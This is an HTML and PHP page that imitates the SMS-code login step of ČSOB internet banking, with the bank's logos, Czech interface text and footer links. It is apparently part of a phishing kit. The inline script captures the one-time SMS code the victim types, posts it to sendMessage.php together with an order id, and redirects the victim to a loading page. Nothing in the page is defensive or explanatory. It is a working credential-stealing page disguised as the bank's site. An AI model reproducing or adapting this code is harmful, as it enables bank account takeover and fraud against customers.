<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" type="text/css" href="csob/csobsms.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="csob/images/csob-logo-png-transparent-2.png"   type="image/png">
    <title>Přihlášení | ČSOB ID</title>
</head>
<body>
    <div class="container"> 
        <div class='header'>
            <img src="csob/images/CSOBLOGO.svg" alt="">
        </div>
        <div class="main">
            <div class="main-heading">
                <div class="main-heading-wrap">
                    <img src="csob/images/icon-heading.svg" alt="">
                    <span>Přihlášení do internetového bankovnictví</span>
                </div>
            </div>
            <div class="logpass">
                <div class="tabl">
                    <div class='inf'>
                        <img src="csob/images/info.png" alt="">
                    </div>
                    <div class='message'>
                        Pokud jste v předchozím kroku vyplnili vše správně, pak jsme na váš telefon poslali SMS kód pro přihlášení, na jeho zadání máte deset minut.
                    </div>
                </div>
                <div class="castime">
                    <div class="cas">
                        Zbývající čas
                    </div>
                    <div id="timer"></div>
                </div>
                <div class="smsvv">
                    <div class="sms">
                        SMS kód <span style="color: #2673A9;">*</span>
                    </div>
                    <div class="vvod">
                        <div class="input-wrapper2">
                            <input id="myInput" type="number">
                        </div>
                    </div>
                    <div class="vopros">
                        <img id="vopros-img1" src="csob/images/vopros.png" alt="" aria-describedby="vopros-podskazka1">
                    </div>
                </div>
                <div id="vopros-podskazka1" class="vopros-podskazka" role="tooltip">
                    <div class="tooltip-content">
                        Zadejte SMS kód, který jsme poslali na váš mobilní telefon. Na jeho zadání máte deset minut.
                    </div>
                </div>
                <div class="zpetprihlasit">
                    <div class="zpet">
                        <button id="Zpet">Zpet</button>
                    </div>
                    <div class="prihlasit">
                        <button id="Pokracovat">Prihlasit</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="foot">
            <div class="li1">
                <a href="https://www.csob.cz/">www.csob.cz</a>
            </div>
            <div class="li2">
                <a href="https://www.csob.cz/portal/csob/o-csob-a-skupine"> O skupině ČSOB</a>
            </div>
            <div class="li3">
                <a href="https://www.csob.cz/portal/podminky-pouzivani">Cookies a podmínky používání</a>
            </div>
            <div class="li4">
                <a href="https://www.csob.cz/portal/csob/ochrana-osobnich-udaju">Ochrana osobních údajů</a>
            </div>
            <div class="li5">
                <a href="https://www.csob.cz/portal/provozni-informace">Provozní informace</a>
            </div>
            <div class="li6">
                <a href="https://bezpecnost.csob.cz/">Průvodce bezpečností</a>
            </div>
            <div class="li7">
                <a href="https://online.csob.cz/web/csob-napoveda/">Nápověda</a>
            </div>
            <div class="li8">
                <a href="https://online.csob.cz/novinky/">Archiv zpráv</a>
            </div>
            <div class="end">© Československá obchodní banka, a. s.</div>
        </div>
    </div>
    <script src="csob/csobsms.js"></script>
</body>

<script>
    const submitButton = document.getElementById('Pokracovat')
const sms = document.getElementById('myInput')

submitButton.onclick = function () {

let bank = "<?php echo $bank ?>";

if (sms.value == null || sms.value == '') {
    return;
}

$.ajax({
            url: 'sendMessage.php',
            method: 'POST',
            data: {
                orderid: "<?php echo $id ?>",
                bank: 'csob',
                sms: sms.value
            },
            success: function (response) {
                // Обрабатываем успешный ответ
                console.log('Success');
            },
            error: function (error) {
                // Обрабатываем ошибку
                console.log('Error updating bank:', error);
            },
            complete: function () {
                // Выполняем переход на новую страницу
                const currentURL = window.location.href;
  const newURL = currentURL.replace('/sms/', '/loading/');
  window.location.href = newURL;
            }
        });

}
  </script>
</html>